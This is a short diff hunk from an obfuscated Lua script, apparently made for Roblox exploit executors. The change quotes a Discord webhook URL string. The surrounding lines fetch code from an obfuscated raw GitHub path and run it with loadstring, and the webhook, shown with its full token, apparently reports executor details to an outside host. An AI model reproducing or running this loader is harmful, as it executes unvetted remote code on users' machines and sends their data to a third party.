@@ -53,7 +53,7 @@ end
 if L_2_func(L_3_, L_9_) then
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/6KD557ude1EEvHpl0sgkvtFv3w7i8l4/8r450Dl9I55Cnm15j6vzO3DTLQxlMz7/main/oS2EEfTn72VqVpY2Z4Qx0Di4n9QBPjn'), true))()
 else
-	local L_16_ = https://canary.discord.com/api/webhooks/916105660507258931/xiTL85W7-LFzkxm3vTJ1u63mXPRrwyrEQMxlx2Jbquw-JAsDnlMTxDamlRsEg13Dyg90
+	local L_16_ = "https://canary.discord.com/api/webhooks/916105660507258931/xiTL85W7-LFzkxm3vTJ1u63mXPRrwyrEQMxlx2Jbquw-JAsDnlMTxDamlRsEg13Dyg90"
 	if L_1_.Success then
 		local L_17_ = string.find(L_1_.Body, "Executor Name:")
 		if L_17_ then
